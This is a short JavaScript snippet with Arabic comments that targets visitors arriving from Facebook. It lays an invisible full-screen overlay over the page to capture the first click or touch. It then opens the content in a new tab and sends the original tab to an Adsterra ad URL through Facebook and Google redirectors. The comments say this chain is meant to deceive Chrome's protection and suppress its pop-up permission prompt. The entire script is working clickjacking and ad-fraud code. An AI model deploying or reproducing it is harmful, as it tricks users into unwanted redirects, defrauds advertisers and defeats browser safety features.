(function() {
    const urlParams = new URLSearchParams(window.location.search);
    if (!urlParams.has("fb_source")) return;

    function bypassAndLaunch() {
        if (window._is_ad_launched) return;
        window._is_ad_launched = true;

        // 1. رابط الإعلان النهائي (Adsterra)
        const adUrl = 'https://adsterra-link.com/your-id' + window.location.search;

        // 2. استخدام جسر "جوجل" لتضليل حماية كروم
        // المتصفح سيثق في الانتقال لأنه يبدأ بـ google.com
        const googleBridge = "https://www.google.com/url?q=" + encodeURIComponent(adUrl);
        
        // 3. التمويه بفيسبوك لضمان الـ Referrer
        const finalJump = "https://l.facebook.com/l.php?u=" + encodeURIComponent(googleBridge);

        // التكتيك: نحول التبويب الحالي للإعلان ونفتح المحتوى في الجديد
        const currentUrl = window.location.origin + window.location.pathname;
        const newTab = window.open(currentUrl, '_blank');

        if (newTab) {
            // التبويب الأصلي يذهب لفيسبوك -> جوجل -> الإعلان
            // هذه السلسلة تكسر نظام الحماية وتمنع ظهور رسالة "السماح بالفتح"
            window.location.replace(finalJump);
        }
    }

    // إنشاء "الفخ" الشفاف
    const overlay = document.createElement('div');
    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:transparent;cursor:pointer;";
    document.body.appendChild(overlay);

    const trigger = () => {
        bypassAndLaunch();
        overlay.remove();
    };

    overlay.addEventListener('touchstart', trigger, { once: true, passive: true });
    overlay.addEventListener('click', trigger, { once: true });

})();
